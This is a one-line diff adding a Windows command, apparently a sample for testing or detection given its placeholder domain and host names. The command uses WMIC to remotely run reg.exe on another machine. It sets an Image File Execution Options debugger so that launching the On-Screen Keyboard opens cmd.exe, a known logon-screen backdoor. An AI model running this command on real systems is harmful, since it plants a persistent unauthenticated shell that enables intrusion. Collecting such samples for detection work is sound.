@@ -1,0 +1,1 @@
+wmic /authority:"kerberos:YOLO\BLIH" /node:BLAH01 process call create 'reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe"'
